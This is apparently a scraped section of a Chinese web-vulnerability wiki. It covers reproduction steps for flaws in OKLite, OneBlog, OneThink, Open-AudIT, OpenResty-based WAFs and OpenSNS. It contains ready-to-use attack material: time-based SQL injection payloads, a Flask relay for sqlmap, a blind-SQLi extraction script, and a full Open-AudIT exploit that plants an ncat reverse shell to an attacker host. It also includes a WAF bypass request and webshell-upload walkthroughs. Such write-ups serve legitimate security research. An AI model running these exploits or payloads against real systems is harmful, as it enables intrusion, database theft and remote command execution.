https://www.jianshu.com/p/27360b192ae3 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:23 "},"Web安全/OKLite/OKLite v2.0.0 后台更新压缩包导致getshell/OKLite v2.0.0 后台更新压缩包导致getshell.html":{"url":"Web安全/OKLite/OKLite v2.0.0 后台更新压缩包导致getshell/OKLite v2.0.0 后台更新压缩包导致getshell.html","title":"OKLite v2.0.0 后台更新压缩包导致getshell","keywords":"","body":"OKLite v2.0.0 后台更新压缩包导致getshell 一、漏洞简介 OKlite 2.0.0管理后台支持压缩包升级，攻击者可以构造包含一句话木马的压缩包文件之后上传到目标服务器，目标服务器在升级过程中会自动解压该压缩包，将一句话木马解压出来，从而导致Getshell。 二、漏洞影响 OKLite v2.0.0 三、复现过程 漏洞分析 文件位置：OKLite_2.0.0\\framework\\view\\update_index.html逻辑代码：zip压缩包升级时会自动调用update类中的zip函数来构造上传表单： 文件位置：OKLite_2.0.0\\framework\\admin\\update_control.php代码逻辑：调用zip函数来构造zip上传表单 文件位置：OKLite_2.0.0\\framework\\libs\\form.php代码逻辑：格式化表单信息 文件位置：OKLite_2.0.0\\framework\\view\\update_zip.html代码逻辑：使用上传的zip文件进行升级 文件位置：OKLite_2.0.0\\framework\\admin\\update_control.php代码逻辑：解压压缩包进行升级 文件位置：OKLite_2.0.0\\framework\\libs\\phpzip.php代码逻辑：解压缩更新包，在解压时未做任何检查操作 文件位置：OKLite_2.0.0\\framework\\admin\\update_control.php代码逻辑：执行程序升级 之后会逐一匹配压缩包中的文件，如果未匹配到会直接解压到根目录下面，所以我们这里可以构造一个shell.zip，之后在压缩包中放置包含一句话木马的shell.php文件，之后进行更新，直接可以Getshell~ 漏洞复现 构造shell.zip文件如下： 之后选择压缩包升级，上传压缩包 之后点击\"开始升级\"进行升级： 之后在网站根目录下可以看到shell.php文件生成： 之后使用菜刀远程连接： 成功getshell 参考链接 https://xz.aliyun.com/t/8130\\#toc-3 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:15 "},"Web安全/OneBlog/OneBlog 小于v2.2.1 远程命令执行漏洞/OneBlog 小于v2.2.1 远程命令执行漏洞.html":{"url":"Web安全/OneBlog/OneBlog 小于v2.2.1 远程命令执行漏洞/OneBlog 小于v2.2.1 远程命令执行漏洞.html","title":"OneBlog 小于v2.2.1 远程命令执行漏洞","keywords":"","body":"OneBlog 小于v2.2.1 远程命令执行漏洞 漏洞描述 OneBlog 小于v2.2.1 由于使用含有漏洞版本的Apache Shiro和默认的密钥导致存在远程命令执行漏洞 漏洞影响 [!NOTE] OneBlog FOFA [!NOTE] app=\"OneBlog开源博客后台管理系统\" 漏洞复现 登陆页面如下 使用工具直接利用Apache Shiro漏洞即可 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:25 "},"Web安全/OneBlog远程代码执行/OneBlog远程代码执行/OneBlog远程代码执行.html":{"url":"Web安全/OneBlog远程代码执行/OneBlog远程代码执行/OneBlog远程代码执行.html","title":"OneBlog远程代码执行","keywords":"","body":"OneBlog远程代码执行 漏洞描述 OneBlog 小于v2.2.1 由于使用含有漏洞版本的Apache Shiro和默认的密钥导致存在远程命令执行漏洞 漏洞影响 OneBlog FOFA app=\"OneBlog开源博客后台管理系统\" 漏洞复现 登录页面如下： 由于OneBlog小于2.2.1版本中使用了存在漏洞版本的Apache Shiro及默认密钥导致存在远程代码执行漏洞，使用shiro反序列化工具进行利用。 成功反弹shell Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:27 "},"Web安全/OneThink/OneThink 前台注入/OneThink 前台注入.html":{"url":"Web安全/OneThink/OneThink 前台注入/OneThink 前台注入.html","title":"OneThink 前台注入","keywords":"","body":"OneThink 前台注入 一、漏洞简介 二、漏洞影响 OneThink \\ 三、复现过程 漏洞分析 以OneThink 1.0.131218为例，本地搭建起one.think 打开源码文件夹，好家伙，踏破铁鞋无觅处，得来全不费工夫------thinkphp3.2.3的框架，那岂不是， 2.png 咱们一起回顾下它sql注入时参数的传递过程 # \\OneThink\\ThinkPHP\\Library\\Think\\Model.class.php #1576L public function where($where,$parse=null){//$where=array(\"username\"=>\"xxx\") ... if(isset($this->options['where'])){ $this->options['where'] = array_merge($this->options['where'],$where);//从左到右，合并数组到options中 }else{ $this->options['where'] = $where; } return $this; } 上边简单进行了数组合并，再跟进find()， 将$option变量传入$this->db对象的select函数， # \\OneThink\\ThinkPHP\\Library\\Think\\Model.class.php #624L public function find($options=array()) { ... $resultSet = $this->db->select($options); ... 进入select函数，关注到它的里面使用到了buildSelectSql方法 $options变量的学问就在其中， # \\OneThink\\ThinkPHP\\Library\\Think\\Db.class.php # 804L ... protected $selectSql = 'SELECT%DISTINCT% %FIELD% FROM %TABLE%%JOIN%%WHERE%%GROUP%%HAVING%%ORDER%%LIMIT% %UNION%%COMMENT%'; ... public function buildSelectSql($options=array()) { if(isset($options['page'])) { // 根据页数计算limit ... $sql = $this->parseSql($this->selectSql,$options);/*关键*/ ... 这个parseSql里面，起到注入作用，最重要的就是parseWhere方法 跟进parseWhere方法，425行将$where拆成$``key和$``val，在后面几个地方传入parseWhereItem()， parseKey是一个取值方法，没实际意义 下面就是注入发生的地方了，好好分析一下这个parseWhereItem()函数 首先，$val来源于上面的$where变量，是咱们可控的；其次，这里正则判断有大问题，没有使用^ $来定界，导致xxINxx这种形式也能通过判断，val[0]在IN后面实际可构造出任意内容，后续进行了拼接，导致sql注入。 # \\OneThink\\ThinkPHP\\Library\\Think\\Db.class.php #469L protected function parseWhereItem($key,$val) { $whereStr = ''; elseif(preg_match('/IN/i',$val[0])){ // IN 运算 if(isset($val[2]) && 'exp'==$val[2]) { $whereStr .= $key.' '.strtoupper($val[0]).' '.$val[1]; }else{ if(is_string($val[1])) { $val[1] = explode(',',$val[1]); } $zone = implode(',',$this->parseValue($val[1])); $whereStr .= $key.' '.strtoupper($val[0]).' ('.$zone.')'; } }elseif(preg_match('/BETWEEN/i',$val[0])){ // BETWEEN运算 $data = is_string($val[1])? explode(',',$val[1]):$val[1]; $whereStr .= ' ('.$key.' '.strtoupper($val[0]).' '.$this->parseValue($data[0]).' AND '.$this->parseValue($data[1]).' )'; } 那么确定存在注入问题，这里咱们看看前台登录地址处，具体怎么注入 漏洞复现 payload1-in注入 username[]=in ('')) and (select 1 from (select sleep(4))x)--+-&password=2&verify=0x401 实际执行SQL语句 SELECT * FROM `onethink_ucenter_member` WHERE ( `username` IN ('')) AND (SELECT 1 FROM (SELECT SLEEP(4))X)-- - () ) LIMIT 1 payload2-exp注入 username[0]=exp&username[1]=>(select 1 from (select sleep(3))x)&password=2&verify=0x401 实际执行SQL语句 SELECT * FROM `onethink_ucenter_member` WHERE ( (`username` > (select 1 from (select sleep(3))x)) ) payload3-between注入 username[0]=BETWEEN 1 and ( select 1 from (select sleep(2))x)))--+-&username[1]=&password=2&verify=0x401 SELECT * FROM `onethink_ucenter_member` WHERE ( (`username` BETWEEN 1 AND ( SELECT 1 FROM (SELECT SLEEP(2))X)))-- - '' AND null ) ) LIMIT 1 ok，现在有了注入，我们就能使用联合查询，来绕过后台用户登录，实现\\\"万能密码\\\"的效果。但在这之前，还需要分析完整的登录逻辑。 登录逻辑分析 使用FileMonitor工具，得到后台登录处的SQL语句 SELECT * FROM `onethink_ucenter_member` WHERE ( `username` = '1' ) LIMIT 1 而数据表onethink_ucenter_member的结构如下图，有11列，那么联合注入就需要构造11个参数union select 1,2,3,4,...,11 接着发现登录处的链接为http://www.0-sec.org/index.php?s=/admin/public/login.html，跟入源码 # OneThink\\Application\\Admin\\Controller\\PublicController.class.php : 31L public function login($username = null, $password = null, $verify = null){ ... $User = new UserApi; $uid = $User->login($username, $password); ... 跟进UcenterMemberModel类，进入login函数 # /OneThink/Application/User/Api/UserApi.class.php #42L ... protected function _init(){ $this->model = new UcenterMemberModel(); //初始化 } ... public function login($username, $password, $type = 1){ return $this->model->login($username, $password, $type); } 继续跟进，发现登录的关键逻辑 # /OneThink/Application/User/Model/UcenterMemberModel.class.php #148L /* 获取用户数据 */ public function login($username, $password, $type = 1){ $map = array(); switch ($type) { case 1: $map['username'] = $username; //【给map数组赋值】 break; ... /* 获取用户数据 */ $user = $this->where($map)->find(); //【1 用户名验证】 if(is_array($user) && $user['status']){ /* 验证用户密码 */ if(think_ucenter_md5($password, UC_AUTH_KEY) === $user['password']){【2 密码验证】 $this->updateLogin($user['id']); //更新用户登录信息 return $user['id']; //登录成功，返回用户ID } else { return -2; //密码错误 } } else { return -1; //用户不存在或被禁用 } 整理知道：一个用户要成功登录，得过两道坎： 用户名验证。即要通过$username的验证，并使得查询出的$user['status']大于零，所以关注$user = $this->where($map)->find()这一条，跟进where()方法，追到\\ThinkPHP文件夹下了，这是注入点。 密码验证。即还要使得think_ucenter_md5($password, UC_AUTH_KEY)等于查询出的$user['password']，$password其实就是咱们登陆时输入的密码，我们跟进think_ucenter_md # \\OneThink\\Application\\User\\Common\\common.php #15L function think_ucenter_md5($str, $key = 'ThinkUCenter'){ return '' === $str ? '' : md5(sha1($str) . $key); } 得出结论：如果输入值为空值，那么加密函数返回的结果也为空值------舒服了，根本不必用到hash计算嘛！所以密码验证这一步也搞定了，只需要让POST上去的密码为空即可！ 网络不是不法之地。虽然已经可以进后台了，但依然不知道管理员的账号密码，有一些登录界面没有验证码，所以这里再提供一种对接SQLMAP的思路（非改tamper），供大家参考 对接sqlmap：Flask参数转发 首先注入点位置如下图 # encoding: utf-8 # sqli-reverse-flask.py from flask import Flask,request,jsonify import requests def remote_login(payload): ''' 对服务器发起访问请求 ''' burp0_url = \"http://one.think:80/index.php?s=/admin/public/login.html\" burp0_headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36\", \"Accept\": \"application/json, text/javascript, */*; q=0.01\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"X-Requested-With\": \"XMLHttpRequest\"} # )) or 1=1 -- - pay = \") =' {} ')-- -\".format(payload) # )={payload} ）1 = 1 print(pay) burp0_data = {\"act\": \"verify\", \"username[0]\": 'exp', \"username[1]\": pay, \"password\": \"\", \"verify\": \"\"} resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False) return resp.text app = Flask(__name__) @app.route('/') def login(): payload = request.args.get(\"id\") print(payload) response = remote_login(payload) return response if __name__ == '__main__': app.run() 那么经过这个转发脚本，原本复杂的参数被简化，你只需要在本地对http://127.0.0.1:5000/?id=1跑sqlmap即可。原理上其实与写tamper脚本相同，都是让sqlmap能够识别出\"简化过的\"注入参数。 python sqlmap.py -u http://127.0.0.1:5000/?id=1 --tech=B --dbms=mysql --batch 参考链接 https://xz.aliyun.com/t/8081\\#toc-1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:32 "},"Web安全/Open-AudIT/（CVE-2020-12078）Open-AudIT v3.3.1 远程命令执行漏洞/（CVE-2020-12078）Open-AudIT v3.3.1 远程命令执行漏洞.html":{"url":"Web安全/Open-AudIT/（CVE-2020-12078）Open-AudIT v3.3.1 远程命令执行漏洞/（CVE-2020-12078）Open-AudIT v3.3.1 远程命令执行漏洞.html","title":"（CVE-2020-12078）Open-AudIT v3.3.1 远程命令执行漏洞","keywords":"","body":"（CVE-2020-12078）Open-AudIT v3.3.1 远程命令执行漏洞 一、漏洞简介 二、漏洞影响 Open-AudIT v3.3.1 三、复现过程 Open-AudITv3.3.1远程命令执行漏洞/media/rId24.png) OpenAudIT-postauth-rce.py #!/usr/bin/python3 # Exploit Title: Open-AudIT Professional v3.3.1 Remote Code Execution # Date: 22/04/2020 # Exploit Author: Askar (@mohammadaskar2) # CVE: CVE-2020-8813 # Vendor Homepage: https://opmantek.com/ # Version: v3.3.1 # Tested on: Ubuntu 18.04 / PHP 7.2.24 import requests import sys import warnings import random import string from bs4 import BeautifulSoup from urllib.parse import quote warnings.filterwarnings(\"ignore\", category=UserWarning, module='bs4') if len(sys.argv) != 6: print(\"[~] Usage : ./openaudit-exploit.py url username password ip port\") exit() url = sys.argv[1] username = sys.argv[2] password = sys.argv[3] ip = sys.argv[4] port = sys.argv[5] request = requests.session() def inject_payload(): configuration_path = url+\"/en/omk/open-audit/configuration/90\" data = 'data={\"data\":{\"id\":\"90\",\"type\":\"configuration\",\"attributes\":{\"value\":\";ncat${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s${IFS};\"}}}' % (ip, port) request.patch(configuration_path, data) print(\"[+] Payload injected in settings\") def start_discovery(): discovery_path = url+\"/en/omk/open-audit/discoveries/create\" post_discovery_path = url+\"/en/omk/open-audit/discoveries\" scan_name = \"\".join([random.choice(string.ascii_uppercase) for i in range(10)]) req = request.get(discovery_path) response = req.text soup = BeautifulSoup(response, \"html5lib\") token = soup.findAll('input')[5].get(\"value\") buttons = soup.findAll(\"button\") headers = {\"Referer\" : discovery_path} request_data = { \"data[attributes][name]\":scan_name, \"data[attributes][other][subnet]\":\"10.10.10.1/24\", \"data[attributes][other][ad_server]\":\"\", \"data[attributes][other][ad_domain]\":\"\", \"submit\":\"\", \"data[type]\":\"discoveries\", \"data[access_token]\":token, \"data[attributes][complete]\":\"y\", \"data[attributes][org_id]\":\"1\", \"data[attributes][type]\":\"subnet\", \"data[attributes][devices_assigned_to_org]\":\"\", \"data[attributes][devices_assigned_to_location]\":\"\", \"data[attributes][other][nmap][discovery_scan_option_id]\":\"1\", \"data[attributes][other][nmap][ping]\":\"y\", \"data[attributes][other][nmap][service_version]\":\"n\", \"data[attributes][other][nmap][open|filtered]\":\"n\", \"data[attributes][other][nmap][filtered]\":\"n\", \"data[attributes][other][nmap][timing]\":\"4\", \"data[attributes][other][nmap][nmap_tcp_ports]\":\"0\", \"data[attributes][other][nmap][nmap_udp_ports]\":\"0\", \"data[attributes][other][nmap][tcp_ports]\":\"22,135,62078\", \"data[attributes][other][nmap][udp_ports]\":\"161\", \"data[attributes][other][nmap][timeout]\":\"\", \"data[attributes][other][nmap][exclude_tcp_ports]\":\"\", \"data[attributes][other][nmap][exclude_udp_ports]\":\"\", \"data[attributes][other][nmap][exclude_ip]\":\"\", \"data[attributes][other][nmap][ssh_ports]\":\"22\", \"data[attributes][other][match][match_dbus]\":\"\", \"data[attributes][other][match][match_fqdn]\":\"\", \"data[attributes][other][match][match_dns_fqdn]\":\"\", \"data[attributes][other][match][match_dns_hostname]\":\"\", \"data[attributes][other][match][match_hostname]\":\"\", \"data[attributes][other][match][match_hostname_dbus]\":\"\", \"data[attributes][other][match][match_hostname_serial]\":\"\", \"data[attributes][other][match][match_hostname_uuid]\":\"\", \"data[attributes][other][match][match_ip]\":\"\", \"data[attributes][other][match][match_ip_no_data]\":\"\", \"data[attributes][other][match][match_mac]\":\"\", \"data[attributes][other][match][match_mac_vmware]\":\"\", \"data[attributes][other][match][match_serial]\":\"\", \"data[attributes][other][match][match_serial_type]\":\"\", \"data[attributes][other][match][match_sysname]\":\"\", \"data[attributes][other][match][match_sysname_serial]\":\"\", \"data[attributes][other][match][match_uuid]\":\"\" } print(\"[+] Creating discovery ..\") req = request.post(post_discovery_path, data=request_data, headers=headers, allow_redirects=False) disocvery_url = url + req.headers['Location'] + \"/execute\" print(\"[+] Triggering payload ..\") print(\"[+] Check your nc ;)\") request.get(disocvery_url) def login(): login_info = { \"redirect_url\": \"/en/omk/open-audit\", \"username\": username, \"password\": password } login_request = request.post(url+\"/en/omk/open-audit/login\", login_info) login_text = login_request.text if \"There was an error authenticating\" in login_text: return False else: return True if login(): print(\"[+] LoggedIn Successfully\") inject_payload() start_discovery() else: print(\"[-] Cannot login!\") Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:38 "},"Web安全/OpenResty/（CVE-2018-9230）bypass OpenResty waf/（CVE-2018-9230）bypass OpenResty waf.html":{"url":"Web安全/OpenResty/（CVE-2018-9230）bypass OpenResty waf/（CVE-2018-9230）bypass OpenResty waf.html","title":"（CVE-2018-9230）bypass OpenResty waf","keywords":"","body":"（CVE-2018-9230）bypass OpenResty waf 一、漏洞简介 OpenResty是一款基于Nginx和Lua的Web平台。该平台用于搭建用于处理高并发、高扩展性的动态Web应用、Web服务和动态网关。OpenResty1.13.6.1之前的版本中存在安全漏洞，该漏洞源于程序使用ngx.req.get_uri_args和ngx.req.get_post_args函数接受参数的数量可以超过100个。远程攻击者可利用该漏洞绕过访问限制，干预Web应用程序防火墙(ngx_lua_waf或X-WAF)产品。 二、漏洞影响 OpenResty \\ 三、复现过程 漏洞分析 A、uri参数获取 首先看一下官方 API 文档，获取一个 uri 有两个方法：ngx.req.get_uri_args、ngx.req.get_post_args，二者主要的区别是参数来源有区别，ngx.req.get_uri_args获取 uri 请求参数，ngx.req.get_post_args获取来自 post 请求内容。 测试用例： server { listen 80; server_name localhost; location /test { content_by_lua_block { local arg = ngx.req.get_uri_args() for k,v in pairs(arg) do ngx.say(“[GET ] key:”, k, “ v:”, v) end ngx.req.read_body() local arg = ngx.req.get_post_args() for k,v in pairs(arg) do ngx.say(“[POST] key:”, k, “ v:”, v) end } } } 输出测试： bypassOpenRestywaf/media/rId26.png) B、参数大小写 当提交同一参数id，根据接收参数的顺序进行排序， 可是当参数id，进行大小写变换，如变形为Id、iD、ID，则会被当做不同的参数。 bypassOpenRestywaf/media/rId28.png) 这里，介绍参数大小写，主要用于进一步构造和理解测试用例。 C、参数溢出 如果当我们不段填充参数，会发生什么情况呢，为此我构造了一个方便用于展示的测试案例，a0-a9，10*10,共100参数，然后第101个参数添加SQL注入 Payload，我们来看看会发生什么？ 测试用例：curl 'www.0-sec.org/test?a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&id=1 union select 1,schema_name,3 from INFORMATION_SCHEMA.schemata 输出结果： bypassOpenRestywaf/media/rId30.png) 可以看到，使用ngx.req.get_uri_args获取uri 请求参数，只获取前100个参数，第101个参数并没有获取到。继续构造一个POST请求，来看一下： bypassOpenRestywaf/media/rId31.png) 使用ngx.req.get_post_args 获取的post请求内容，也同样只获取前100个参数。 检查这两个函数的文档，出于安全原因默认的限制是100，它们接受一个可选参数，最多可以告诉它应该解析多少GET / POST参数。但只要攻击者构造的参数超过限制数就可以轻易绕过基于OpenResty的安全防护，这就存在一个uri参数溢出的问题。 综上，通过ngx.req.get_uri_args、ngx.req.get_post_args获取uri参数，当提交的参数超过限制数（默认限制100或可选参数限制），uri参数溢出，无法获取到限制数以后的参数值，更无法对攻击者构造的参数进行有效安全检测，从而绕过基于OpenResty的WEB安全防护。 漏洞复现 基于OpenResty构造的WEB安全防护，大多数使用ngx.req.get_uri_args、ngx.req.get_post_args获取uri参数，即默认限制100，并没有考虑参数溢出的情况，攻击者可构造超过限制数的参数，轻易的绕过安全防护。基于OpenResty的开源WAF如：ngx_lua_waf、X-WAF、Openstar等，均受影响。 A、ngx_lua_waf ngx_lua_waf是一个基于lua-nginx-module(openresty)的web应用防火墙 github源码：https://github.com/loveshell/ngx\\_lua\\_waf 拦截效果图： bypassOpenRestywaf/media/rId34.png) 利用参数溢出Bypass：bypassOpenRestywaf/media/rId35.png) B、X-WAF X-WAF是一款适用中、小企业的云WAF系统，让中、小企业也可以非常方便地拥有自己的免费云WAF。 官网：https://waf.xsec.io github源码：https://github.com/xsec-lab/x-waf 拦截效果图： bypassOpenRestywaf/media/rId38.png) 利用参数溢出Bypass： bypassOpenRestywaf/media/rId39.png) 参考链接 https://www.anquanke.com/post/id/103771 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:39 "},"Web安全/OpenSNS/OpenSNS sql注入/OpenSNS sql注入.html":{"url":"Web安全/OpenSNS/OpenSNS sql注入/OpenSNS sql注入.html","title":"OpenSNS sql注入","keywords":"","body":"OpenSNS sql注入 一、漏洞简介 OpenSNS是基于OneThink的轻量级社交化用户中心框架，系统秉持简约的设计风格，注重交流，为用户提供了一套轻量级的社交方案。OpenSNS前身是\"ThinkOX\"，2015年1月28号正式更名为OpenSNS。 OpenSNS采用PHP+MYSQL构建的一款有\"身份\"的开源免费SNS社交系统，适用于多种社会关系。 OpenSNS采用thinkphp框架编写。系统的设计遵循高内聚低耦合，允许管理员自由开启关闭功能模块。不仅如此，OpenSNS还内置了一个功能扩展商店，可以一键在线安装新的功能扩展。 OpenSNS目前有大量的国内开发者，云市场也上架了大量的第三方功能模块和主题应用，使OpenSNS可以同时满足各行各业的社交需求。 二、漏洞影响 三、复现过程 SQL注入(一) 需要注册一个账号并登录 sqlmap.py -u \"http://localhost/index.php?s=/ucenter/Config/&uid=1*\" --cookie \" PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136\" --batch --technique=T --dbms \"mysql\" sqlmap.py -u \"http://localhost/index.php?s=/ucenter/Config/&uid=1*\" --cookie \" PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136\" --batch --technique=T --dbms \"mysql\" --is-dba sqlmap.py -u \"http://localhost/index.php?s=/ucenter/Config/&uid=1*\" --cookie \" PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136\" --batch --technique=T --dbms \"mysql\" --current-db 同类h注入点 http://0-sec.org/index.php?s=/ucenter/index/index&uid=10 http://0-sec.org/index.php?s=/ucenter/index/information&uid=10 SQL注入(二) 需要注册一个账号并登录 sqlmap.py -u \"http://localhost/index.php?s=/ucenter/index/getExpandInfo&uid=1)*--+\" --cookie \"PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136;opensns_OX_LOGGED_USER=HYnkRzJxTkdgAdhKfVfkJ8n4kjemH%3DgWJU16IaiiFhglB7nm66fAxbZ9TTZXz%3DWWqjeQ5%3Di4bjZITf04G20E4v35V135D8miM5F2Jzf6VkgkYymtohawe\" --dbms \"mysql\" --batch sqlmap.py -u \"http://localhost/index.php?s=/ucenter/index/getExpandInfo&uid=1)*--+\" --cookie \"PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136;opensns_OX_LOGGED_USER=HYnkRzJxTkdgAdhKfVfkJ8n4kjemH%3DgWJU16IaiiFhglB7nm66fAxbZ9TTZXz%3DWWqjeQ5%3Di4bjZITf04G20E4v35V135D8miM5F2Jzf6VkgkYymtohawe\" --dbms \"mysql\" --batch --is-dba sqlmap.py -u \"http://localhost/index.php?s=/ucenter/index/getExpandInfo&uid=1)*--+\" --cookie \"PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136;opensns_OX_LOGGED_USER=HYnkRzJxTkdgAdhKfVfkJ8n4kjemH%3DgWJU16IaiiFhglB7nm66fAxbZ9TTZXz%3DWWqjeQ5%3Di4bjZITf04G20E4v35V135D8miM5F2Jzf6VkgkYymtohawe\" --dbms \"mysql\" --batch --current-d Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:42 "},"Web安全/OpenSNS/OpenSNS v6.1.0 前台sql注入/OpenSNS v6.1.0 前台sql注入.html":{"url":"Web安全/OpenSNS/OpenSNS v6.1.0 前台sql注入/OpenSNS v6.1.0 前台sql注入.html","title":"OpenSNS v6.1.0 前台sql注入","keywords":"","body":"OpenSNS v6.1.0 前台sql注入 一、漏洞简介 二、漏洞影响 OpenSNS v6.1.0 三、复现过程 漏洞分析 Addons/ChinaCity/Controller/ChinaCityController.class.php:50 发现我们输入的payload，向前查找，最开始从$_POST获取，如何处理，到此处 ThinkPHP/Common/functions.php:343 跟进I函数获取到payload 继续跟发现有参数过滤，可仔细一看跟没过滤一样 到这里向前追溯就结束了，从$pid = I('pid'); 向后跟 跟进 \\Addons\\ChinaCity\\Model\\DistrictModel::_list $list = D('Addons://ChinaCity/District')->_list($map);跟进 Addons/ChinaCity/Model/DistrictModel.class.php:12 ThinkPHP/Library/Think/Model.class.php:618 $resultSet = $this->db->select($options);ThinkPHP/Library/Think/Db.class.php:772 Db.class.php:799, Think\\Db->buildSelectSql() 下的 $this->parseSQl ThinkPHP/Library/Think/Db.class.php:799 ThinkPHP/Library/Think/Db.class.php:804 发现执行了2个其他的sql语句，在此处（buildSelectSql 里->return $sql）下断点可以看到sql语句 ThinkPHP/Library/Think/Db.class.php:813 ThinkPHP/Library/Think/Db.class.php:821 $this->parseWhere(!empty($options['where'])?$options['where']:''), ThinkPHP/Library/Think/Db.class.php:423 跟到 ThinkPHP/Library/Think/Db.class.php:457 ThinkPHP/Library/Think/Db.class.php:468 ThinkPHP/Library/Think/Db.class.php:457 ThinkPHP/Library/Think/Db.class.php:497 虽然这个地方有转译，但只有$val[1] ThinkPHP/Library/Think/Db.class.php:464 ThinkPHP/Library/Think/Db.class.php:813 ThinkPHP/Library/Think/Db.class.php:773 $result = $this->query($sql,$this->parseBind(!empty($options['bind'])?$options['bind']:array())); 执行成功 sleep了 Db.class.php:469, Think\\Db->parseWhereItem() Db.class.php:457, Think\\Db->parseWhere() Db.class.php:821, Think\\Db->parseSql() Db.class.php:799, Think\\Db->buildSelectSql() Db.class.php:772, Think\\Db->select() Model.class.php:618, Think\\Model->select() DistrictModel.class.php:12, Addons\\ChinaCity\\Model\\DistrictModel->_list() ChinaCityController.class.php:58, Addons\\ChinaCity\\Controller\\ChinaCityController->getCity() AddonsController.class.php:42, Home\\Controller\\AddonsController->execute() App.class.php:153, ReflectionMethod->invokeArgs() App.class.php:153, Think\\App::exec() App.class.php:193, Think\\App::run() Think.class.php:121, Think\\Think::start() ThinkPHP.php:96, require() index.php:73, {main}() 漏洞复现 vul url http://0-sec.org/uploads_download_2019-07-16_5d2d5d4697d88/index.php?s=/home/addons/_addons/china_city/_controller/china_city/_action/getcity.html poc POST /index.php?s=%2Fhome%2Faddons%2F_addons%2Fchina_city%2F_controller%2Fchina_city%2F_action%2Fgetcity.html HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 Content-Length: 116 Accept: */* Cookie: Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,und;q=0.7 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://192.168.95.131 Referer: http://192.168.95.131/uploads_download_2019-07-16_5d2d5d4697d88/index.php?s=/ucenter/config/index.html X-Requested-With: XMLHttpRequest Accept-Encoding: gzip cid=0&pid%5B0%5D=%3D%28select%2Afrom%28select%2Bsleep%283%29union%2F%2A%2A%2Fselect%2B1%29a%29and+3+in+&pid%5B1%5D=3 Vulnerability file Addons/ChinaCity/Controller/ChinaCityController.class.php:50 ThinkPHP/Library/Think/Db.class.php:772 exp import requests from requests import exceptions url=\"http://192.168.95.131/uploads_download_2019-07-16_5d2d5d4697d88/index.php?s=/home/addons/_addons/china_city/_controller/china_city/_action/getcity.html\" header={'X-Requested-With':'XMLHttpRequest'} # proxies={'http':'127.0.0.1:8080'} flag='' for i in range(1,50): for j in range(32,128): try: data={ 'cid':0, 'pid[0]':\"=(select if(ord(substr((select version()),{},1))={},sleep(10),0))AND 3 IN \".format(i,j), 'pid[1]':3 } # print data['pid[0]'] r=requests.post(url,data=data,headers=header,timeout=5) except exceptions.Timeout : flag+=chr(j) print flag 参考链接 https://www.t00ls.net/thread-54688-1-1.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:43 "},"Web安全/OpenSNS/OpenSNS 后台getshell/OpenSNS 后台getshell.html":{"url":"Web安全/OpenSNS/OpenSNS 后台getshell/OpenSNS 后台getshell.html","title":"OpenSNS 后台getshell","keywords":"","body":"OpenSNS 后台getshell 一、漏洞简介 二、漏洞影响 三、复现过程 1. 打开网站后台找到模板上传位置： 2. 配置一个压缩包，压缩包里是一句话木马： 3. 选择上传： 4、会在./Theme目录下自动生成刚刚上传好的马尔 image Qingy文库 all right reserved，powered by GitbookFile 